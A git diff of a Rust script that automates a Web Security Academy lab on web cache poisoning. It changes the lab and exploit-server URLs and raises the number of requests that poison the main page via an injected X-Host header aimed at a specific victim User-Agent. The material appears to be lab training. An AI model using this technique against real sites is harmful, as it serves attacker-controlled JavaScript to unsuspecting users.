@@ -27,10 +27,10 @@ use std::{
 use text_colorizer::Colorize;
 
 // Change this to your lab URL
-const LAB_URL: &str = "https://0aed0053039c117980f603f2009a0087.h1-web-security-academy.net";
+const LAB_URL: &str = "https://0a58004e04fd8168849ab48e000500e4.h1-web-security-academy.net";
 
 // Change this to your exploit server DOMAIN
-const EXPLOIT_SERVER_DOMAIN: &str = "exploit-0a50000d039d1141807b021a011f0029.exploit-server.net";
+const EXPLOIT_SERVER_DOMAIN: &str = "exploit-0a4800b2047e81ed8428b377016b00c5.exploit-server.net";
 
 lazy_static! {
     static ref WEB_CLIENT: Client = build_web_client();
@@ -74,9 +74,9 @@ fn main() {
     println!("❯❯ Victim's User-Agent: {}", user_agent.yellow());
 
     // send multiple request to cache the request
-    // 5 is enough
-    for i in 1..=5 {
-        print!("\r⦗6⦘ Poisoning the main page for specific subset of users ({i}/5).. ");
+    // 10 is enough
+    for i in 1..=10 {
+        print!("\r⦗6⦘ Poisoning the main page for specific subset of users ({i}/10).. ");
         flush_terminal();
 
         poison_main_page(&user_agent);
@@ -176,7 +176,7 @@ fn store_javascript_file_on_exploit_server() {
         ));
 }
 
-fn poison_main_page(user_agent: &str) {
+fn poison_main_page(user_agent: &str) -> Response {
     WEB_CLIENT
         .get(LAB_URL)
         .header("X-Host", EXPLOIT_SERVER_DOMAIN)
@@ -185,7 +185,7 @@ fn poison_main_page(user_agent: &str) {
         .expect(&format!(
             "{}",
             "⦗!⦘ Failed to fetch the main page with the injected payload".red()
-        ));
+        ))
 }
 
 #[inline(always)]
